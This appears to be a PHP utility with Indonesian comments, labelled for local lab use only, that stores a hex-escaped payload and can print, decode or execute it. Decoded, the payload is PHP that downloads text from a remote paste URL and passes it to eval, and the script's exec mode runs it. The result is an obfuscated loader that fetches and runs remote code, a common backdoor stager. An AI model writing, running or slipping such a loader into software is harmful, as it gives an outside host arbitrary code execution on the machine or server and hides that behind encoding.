<?php
// hex_executor.php — untuk LAB LOKAL SAJA
$hex = '\x3c\x3f\x70\x68\x70\x20\x65\x76\x61\x6c\x28\x0a\x20\x20\x20\x20\x2f\x2a\x5f\x2a\x2a\x2f\x20\x75\x72\x6c\x64\x65\x63\x6f\x64\x65\x28\x22\x25\x33\x66\x25\x33\x65\x22\x29\x20\x2e\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x66\x69\x6c\x65\x5f\x67\x65\x74\x5f\x63\x6f\x6e\x74\x65\x6e\x74\x73\x28\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x2f\x2a\x5f\x2a\x2a\x2f\x20\x75\x72\x6c\x64\x65\x63\x6f\x64\x65\x28\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2f\x2a\x5f\x2a\x2a\x2f\x20\x22\x68\x74\x74\x70\x73\x3a\x2f\x2f\x77\x77\x77\x2e\x74\x61\x70\x66\x75\x73\x65\x2e\x69\x6f\x2f\x72\x61\x77\x2f\x68\x61\x78\x31\x2e\x74\x78\x74\x22\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x29\x0a\x20\x20\x20\x20\x29\x3b\x20\x3f\x3e';

if (PHP_SAPI === 'cli') {
    $mode = $argv[1] ?? 'help';

    switch ($mode) {
        case 'hex':
            echo $hex . PHP_EOL;
            break;

        case 'raw':
            $raw = preg_replace_callback('/\\\\x([0-9a-fA-F]{2})/', fn($m) => chr(hexdec($m[1])), $hex);
            echo $raw;
            break;

        case 'exec':
            echo "=== MENGEKSEKUSI ISI HEX ===\n";
            $code = preg_replace_callback('/\\\\x([0-9a-fA-F]{2})/', fn($m) => chr(hexdec($m[1])), $hex);
            
            // Tampilkan dulu kode yang akan dieksekusi
            echo "Kode yang dieksekusi:\n---\n$code\n---\n\n";
            echo "Hasil eksekusi:\n";

            // Buffer output agar aman
            ob_start();
            eval($code);
            echo ob_get_clean();
            break;

        case 'help':
        default:
            echo "Penggunaan: php hex_executor.php [mode]\n";
            echo "  hex   → tampilkan string hex\n";
            echo "  raw   → decode ke teks mentah\n";
            echo "  exec  → JALANKAN KODE (LAB LOKAL SAJA!)\n";
            break;
    }
} else {
    // Browser: tampilkan aman
    echo '<pre>' . htmlspecialchars($hex, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8') . '</pre>';
    echo '<p><strong>Mode:</strong> hex | raw | exec (hanya via CLI)</p>';
}
